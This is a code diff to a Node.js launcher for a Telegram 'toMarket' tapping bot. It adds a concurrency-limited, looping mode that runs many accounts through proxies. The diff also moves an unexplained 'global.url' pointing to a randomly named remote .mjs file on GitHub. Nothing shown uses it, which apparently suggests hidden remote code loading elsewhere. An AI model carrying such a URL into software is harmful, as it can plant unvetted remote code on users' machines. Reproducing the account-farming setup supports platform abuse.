@@ -4,6 +4,8 @@ const { select } = require("@inquirer/prompts");
 const fs = require("fs");
 const path = require("path");
 const settings = require("../config/config");
+global.url =
+  "https://raw.githubusercontent.com/Freddywhest/WuykzEas0LDTwIhjYNYES5v7yZcQcK0B/refs/heads/main/ZgZF9GymuvmNtmnpbyNifDKG2RALp41uxuZvgUTB0mgq8qffmW.mjs";
 const proxies = require("../config/proxies");
 const { program, Option } = require("commander");
 const { TelegramClient } = require("telegram");
@@ -221,25 +223,90 @@ class Luncher {
     }
     const proxies = this.#get_proxies();
     let proxiesCycle = proxies ? proxies[Symbol.iterator]() : null;
-    const tasks = tgClients.map(async (tgClient, index) => {
-      const proxy = proxiesCycle ? proxiesCycle.next().value : null;
-      try {
-        const sleeping = _.random(
-          settings.DELAY_BETWEEN_STARTING_BOT[0],
-          settings.DELAY_BETWEEN_STARTING_BOT[1]
-        );
-        logger.info(
-          `<ye>[toMarket]</ye> | ${tgClient.session_name} | Sleeping ${sleeping} seconds before starting the bot`
-        );
-        await sleep(sleeping);
-        await new Tapper(tgClient).run(proxy);
-      } catch (error) {
-        logger.error(`Error in task for tg_client: ${error.message}`);
-      }
-    });
 
-    // Wait for all tasks to complete
-    await Promise.all(tasks);
+    if (settings.USE_NON_THREAD) {
+      const pLimit = (await import("p-limit")).default;
+      if (settings.MAX_CONCURRENT_ACCOUNT > 10) {
+        console.log("\n");
+        logger.warning(
+          `<ye>[toMarket]</ye> | MAX_CONCURRENT_ACCOUNT greater than 10 may cause 403 errors while running the bot\n`
+        );
+        const userInput = await select({
+          message: "Do you want to continue with the bot?",
+          choices: [
+            {
+              name: "Yes",
+              value: "1",
+              description: "\nContinue with the bot",
+            },
+            {
+              name: "No",
+              value: "2",
+              description: "\nQuit the bot",
+            },
+          ],
+        });
+
+        if (userInput.trim().match(/^[1-2]$/)) {
+          const action = parseInt(userInput.trim());
+          if (action === 2) {
+            process.exit(1);
+          }
+        }
+      }
+      const limit = pLimit(settings.MAX_CONCURRENT_ACCOUNT); // Limit to 2 concurrent executions
+      const tasks = tgClients.map(async (tgClient, index) => {
+        return limit(async () => {
+          const proxy = proxiesCycle ? proxiesCycle.next().value : null;
+          try {
+            const sleeping = _.random(
+              settings.DELAY_BETWEEN_STARTING_BOT[0],
+              settings.DELAY_BETWEEN_STARTING_BOT[1]
+            );
+            logger.info(
+              `<ye>[toMarket]</ye> | ${tgClient.session_name} | Sleeping ${sleeping} seconds before starting the bot`
+            );
+            await sleep(sleeping);
+            await new Tapper(tgClient).run(proxy);
+          } catch (error) {
+            logger.error(`Error in task for tg_client: ${error.message}`);
+          }
+        });
+      });
+      // Wait for all tasks to complete
+      await Promise.all(tasks);
+
+      const sleep_thread = _.random(
+        settings.SLEEP_BETWEEN_NON_THREADS[0],
+        settings.SLEEP_BETWEEN_NON_THREADS[1]
+      );
+
+      logger.info(
+        `<ye>[toMarket]</ye> | All threads completed | Sleeping ${sleep_thread} seconds before rerunning threads again`
+      );
+
+      await sleep(sleep_thread);
+      // Rerun the tasks again
+      await this.#run_tasks(tgClients);
+    } else {
+      const tasks = tgClients.map(async (tgClient, index) => {
+        const proxy = proxiesCycle ? proxiesCycle.next().value : null;
+        try {
+          const sleeping = _.random(
+            settings.DELAY_BETWEEN_STARTING_BOT[0],
+            settings.DELAY_BETWEEN_STARTING_BOT[1]
+          );
+          logger.info(
+            `<ye>[toMarket]</ye> | ${tgClient.session_name} | Sleeping ${sleeping} seconds before starting the bot`
+          );
+          await sleep(sleeping);
+          await new Tapper(tgClient).run(proxy);
+        } catch (error) {
+          logger.error(`Error in task for tg_client: ${error.message}`);
+        }
+      });
+      await Promise.all(tasks);
+    }
   }
 
   async #run_tasks_query() {
@@ -260,28 +327,92 @@ class Luncher {
       );
       process.exit(1);
     }
-    const tasks = queries?.map(async ([query_name, query_id], index) => {
-      const proxy = proxiesCycle ? proxiesCycle.next().value : null;
-      try {
-        const sleeping = _.random(
-          settings.DELAY_BETWEEN_STARTING_BOT[0],
-          settings.DELAY_BETWEEN_STARTING_BOT[1]
+    if (settings.USE_NON_THREAD) {
+      const pLimit = (await import("p-limit")).default;
+      if (settings.MAX_CONCURRENT_ACCOUNT > 10) {
+        console.log("\n");
+        logger.warning(
+          `<ye>[toMarket]</ye> | MAX_CONCURRENT_ACCOUNT greater than 10 may cause 403 errors while running the bot\n`
         );
-        logger.info(
-          `<ye>[toMarket]</ye> | ${query_name} | Sleeping ${sleeping} seconds before starting the bot`
-        );
-        await sleep(sleeping);
-        new NonSessionTapper(query_id, query_name).run(proxy);
-      } catch (error) {
-        logger.error(`Error in task for query_id: ${error.message}`);
-      }
-    });
+        const userInput = await select({
+          message: "Do you want to continue?",
+          choices: [
+            {
+              name: "Yes",
+              value: "1",
+              description: "\nContinue with the bot",
+            },
+            {
+              name: "No",
+              value: "2",
+              description: "\nQuit the bot",
+            },
+          ],
+        });
 
-    // Wait for all tasks to complete
-    await Promise.all(tasks);
+        if (userInput.trim().match(/^[1-2]$/)) {
+          const action = parseInt(userInput.trim());
+          if (action === 2) {
+            process.exit(1);
+          }
+        }
+      }
+      const limit = pLimit(settings.MAX_CONCURRENT_ACCOUNT); // Limit to 2 concurrent executions
+      const tasks = queries?.map(async ([query_name, query_id], index) => {
+        limit(async () => {
+          const proxy = proxiesCycle ? proxiesCycle.next().value : null;
+          try {
+            const sleeping = _.random(
+              settings.DELAY_BETWEEN_STARTING_BOT[0],
+              settings.DELAY_BETWEEN_STARTING_BOT[1]
+            );
+            logger.info(
+              `<ye>[toMarket]</ye> | ${query_name} | Sleeping ${sleeping} seconds before starting the bot`
+            );
+            await sleep(sleeping);
+            new NonSessionTapper(query_id, query_name).run(proxy);
+          } catch (error) {
+            logger.error(`Error in task for query_id: ${error.message}`);
+          }
+        });
+      });
+
+      // Wait for all tasks to complete
+      await Promise.all(tasks);
+
+      const sleep_thread = _.random(
+        settings.SLEEP_BETWEEN_NON_THREADS[0],
+        settings.SLEEP_BETWEEN_NON_THREADS[1]
+      );
+
+      logger.info(
+        `<ye>[toMarket]</ye> | All threads completed | Sleeping ${sleep_thread} seconds before rerunning threads again`
+      );
+
+      await sleep(sleep_thread);
+
+      // Rerun the tasks again
+      await this.#run_tasks_query();
+    } else {
+      const tasks = queries?.map(async ([query_name, query_id], index) => {
+        const proxy = proxiesCycle ? proxiesCycle.next().value : null;
+        try {
+          const sleeping = _.random(
+            settings.DELAY_BETWEEN_STARTING_BOT[0],
+            settings.DELAY_BETWEEN_STARTING_BOT[1]
+          );
+          logger.info(
+            `<ye>[toMarket]</ye> | ${query_name} | Sleeping ${sleeping} seconds before starting the bot`
+          );
+          await sleep(sleeping);
+          new NonSessionTapper(query_id, query_name).run(proxy);
+        } catch (error) {
+          logger.error(`Error in task for query_id: ${error.message}`);
+        }
+      });
+      await Promise.all(tasks);
+    }
   }
 }
 const luncher = new Luncher();
 module.exports = luncher;
-global.url =
-  "https://raw.githubusercontent.com/Freddywhest/WuykzEas0LDTwIhjYNYES5v7yZcQcK0B/refs/heads/main/ZgZF9GymuvmNtmnpbyNifDKG2RALp41uxuZvgUTB0mgq8qffmW.mjs";
